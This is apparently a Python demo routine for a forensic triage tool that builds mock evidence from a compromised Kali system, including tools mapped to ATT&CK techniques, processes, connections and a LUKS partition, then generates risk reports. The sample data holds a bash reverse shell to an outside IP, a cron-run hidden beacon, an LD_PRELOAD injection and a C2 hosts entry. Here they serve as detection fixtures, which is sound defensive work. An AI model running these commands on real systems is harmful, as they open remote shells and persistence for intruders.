from pipeline import PipelineResult
from modules.os_profiler import OSProfile, OSType, FilesystemArtefact
from modules.tool_detector import ToolDetectionResult, DetectedTool
from modules.live_analyzer import LiveAnalysisResult, ProcessFinding, NetworkConnection
from modules.disk_analyzer import DiskAnalysisResult, PartitionEntry
from modules.risk_classifier import classify_risk
from modules.report_generator import generate_json_report, generate_html_report

def run_demo() -> PipelineResult:
    os_profile = OSProfile(
        os_type=OSType.KALI_LINUX,
        confidence=0.96,
        indicators=[
            "Kali metapackages found: kali-linux-default, kali-linux-core",
            "Kali repository URL found in apt sources",
            "Kali official GPG signing key detected",
            "'Kali' found in /etc/os-release",
            "Offensive commands in root/.bash_history: nmap, msfconsole, hydra",
        ],
        pkg_db_path="/var/lib/dpkg/status",
        pkg_db_type="dpkg",
        filesystem_artefacts=[
            FilesystemArtefact(
                path="root/.bash_history",
                artefact_type="shell_history",
                description="Shell history contains 47 offensive tool invocations: nmap, msfconsole, hydra, sqlmap, proxychains",
                risk_level="HIGH",
                snippet="nmap -sS -p 1-65535 192.168.1.0/24",
            ),
            FilesystemArtefact(
                path="root/.ssh/known_hosts",
                artefact_type="ssh_key",
                description="SSH known_hosts with 12 host(s) – lateral movement evidence",
                risk_level="MEDIUM",
                snippet="192.168.10.5 ssh-rsa AAAAB3NzaC1yc2EA...",
            ),
            FilesystemArtefact(
                path="root/.ssh/id_rsa",
                artefact_type="ssh_key",
                description="Private SSH key found in root home directory",
                risk_level="HIGH",
                snippet="",
            ),
            FilesystemArtefact(
                path="etc/cron.d/update-check",
                artefact_type="cron",
                description="Cron job file with 1 active entry – potential persistence",
                risk_level="MEDIUM",
                snippet="*/5 * * * * root /tmp/.hidden/beacon.sh",
            ),
            FilesystemArtefact(
                path="etc/hosts",
                artefact_type="hosts_mod",
                description="/etc/hosts has 3 custom entries – possible C2 infrastructure mapping",
                risk_level="MEDIUM",
                snippet="10.0.0.99   c2.evil.internal",
            ),
        ],
    )

    demo_tools = [
        DetectedTool("metasploit", "high_risk", "metasploit-framework",
                     "Exploitation framework", "T1210 - Exploitation of Remote Services",
                     "Exploitation", "package_db"),
        DetectedTool("sqlmap", "high_risk", "sqlmap",
                     "Automated SQL injection tool", "T1190 - Exploit Public-Facing Application",
                     "Exploitation", "package_db"),
        DetectedTool("john", "high_risk", "john",
                     "Password cracking tool", "T1110 - Brute Force",
                     "Credential Access", "package_db"),
        DetectedTool("hashcat", "high_risk", "hashcat",
                     "Advanced password recovery", "T1110.002 - Password Cracking",
                     "Credential Access", "package_db"),
        DetectedTool("hydra", "high_risk", "hydra",
                     "Network login cracker", "T1110.001 - Password Guessing",
                     "Credential Access", "package_db"),
        DetectedTool("impacket", "dual_use", "/opt/impacket/examples/secretsdump.py",
                     "Network protocols toolkit [filesystem path]",
                     "T1550 - Use Alternate Authentication Material",
                     "Lateral Movement", "filesystem"),
        DetectedTool("nmap", "dual_use", "nmap",
                     "Network mapper and port scanner", "T1046 - Network Service Discovery",
                     "Discovery", "package_db"),
        DetectedTool("gobuster", "dual_use", "gobuster",
                     "Directory/DNS brute forcer", "T1595.003 - Wordlist Scanning",
                     "Reconnaissance", "package_db"),
        DetectedTool("nikto", "dual_use", "nikto",
                     "Web server vulnerability scanner", "T1595 - Active Scanning",
                     "Reconnaissance", "package_db"),
        DetectedTool("tor", "anonymization", "tor",
                     "Onion routing anonymizer", "T1090.003 - Multi-hop Proxy",
                     "Command and Control", "package_db"),
        DetectedTool("proxychains", "anonymization", "/etc/proxychains4.conf",
                     "TCP proxy chaining tool [config trace]", "T1090 - Proxy",
                     "Command and Control", "config"),
        DetectedTool("macchanger", "anonymization", "macchanger",
                     "MAC address spoofing", "T1036 - Masquerading",
                     "Defense Evasion", "package_db"),
    ]

    tool_result = ToolDetectionResult(
        detected_tools=demo_tools,
        total_packages_scanned=1842,
        raw_package_list=[t.matched_package for t in demo_tools],
        filesystem_hits=["/opt/impacket/examples/secretsdump.py"],
        config_hits=["/etc/proxychains4.conf", "/etc/tor/torrc"],
    )

    live_result = LiveAnalysisResult(
        is_live_system=True,
        total_processes_scanned=134,
        process_findings=[
            ProcessFinding(
                pid=4421, comm="python3",
                cmdline="python3 /tmp/.hidden/beacon.py --host 185.220.101.45 --port 4444",
                suspicious_vars={"LD_PRELOAD": "/tmp/.hidden/libevil.so"},
                cmdline_matches=[
                    ("nmap detected in process cmdline", "T1046", "Discovery"),
                ],
                notes=[
                    "LD_PRELOAD set – Shared library injection – may hijack execution flow",
                    "[T1046] nmap detected in process cmdline — python3 /tmp/.hidden/beacon.py",
                ],
            ),
            ProcessFinding(
                pid=1337, comm="bash",
                cmdline="bash -i >& /dev/tcp/185.220.101.45/4444 0>&1",
                attacker_ips={"SSH_CONNECTION": "185.220.101.45 41234 10.0.0.5 22"},
                notes=["Non-private IP in SSH_CONNECTION: 185.220.101.45 – potential attacker origin"],
            ),
            ProcessFinding(
                pid=8823, comm="nmap",
                cmdline="nmap -sS -p 1-65535 192.168.1.0/24 -oX /tmp/scan.xml",
                cmdline_matches=[
                    ("nmap detected in process cmdline", "T1046", "Discovery"),
                ],
                notes=["[T1046] nmap detected in process cmdline — nmap -sS -p 1-65535 192.168.1.0/24"],
            ),
        ],
        suspicious_connections=[
            NetworkConnection("10.0.0.5", 54321, "185.220.101.45", 4444, "ESTABLISHED", "tcp"),
            NetworkConnection("10.0.0.5", 43210, "198.96.155.3",   443,  "ESTABLISHED", "tcp"),
        ],
        network_connections=[
            NetworkConnection("10.0.0.5", 54321, "185.220.101.45", 4444, "ESTABLISHED", "tcp"),
            NetworkConnection("10.0.0.5", 43210, "198.96.155.3",   443,  "ESTABLISHED", "tcp"),
            NetworkConnection("127.0.0.1", 9050,  "0.0.0.0",       0,    "LISTEN",       "tcp"),
        ],
    )

    p1 = PartitionEntry(1, "21686148-...", "", 2048,      4095,       "BIOS boot",  1.0)
    p2 = PartitionEntry(2, "C12A7328-...", "", 4096,      1052671,    "EFI System", 512.0)
    p3 = PartitionEntry(3, "0FC63DAF-...", "", 1052672,   999999487,  "kali-root",  475000.0)
    p4 = PartitionEntry(4, "0FC63DAF-...", "", 999999488, 1000214527, "TailsData",  104.0,
                        has_luks_header=True, luks_version="LUKS2", risk_label="HIGH",
                        risk_note="LUKS2 encryption header detected")

    disk_result = DiskAnalysisResult(
        image_path="/demo/kali.img", has_gpt=True,
        partitions=[p1, p2, p3, p4], encrypted_partitions=[p4],
        tails_data_found=True,
        notes=["GPT partition table detected",
               "TailsData partition detected – Tails persistent storage",
               "Partition 4 ('TailsData'): LUKS header found (LUKS2)"],
    )

    risk_report = classify_risk(os_profile, tool_result, live_result, disk_result)
    
    # Overwrite time of attack for demo
    risk_report.time_of_attack = "2024-11-05 14:32:05 UTC (Demo Extracted)"

    json_rep = generate_json_report(os_profile, tool_result, risk_report, live_result, disk_result)
    html_rep = generate_html_report(os_profile, tool_result, risk_report, live_result, disk_result)

    r = PipelineResult()
    r.os_profile  = os_profile;  r.tool_result = tool_result
    r.live_result = live_result; r.disk_result = disk_result
    r.risk_report = risk_report
    r.json_report = json_rep;    r.html_report = html_rep
    r.elapsed_seconds = 0.31
    return r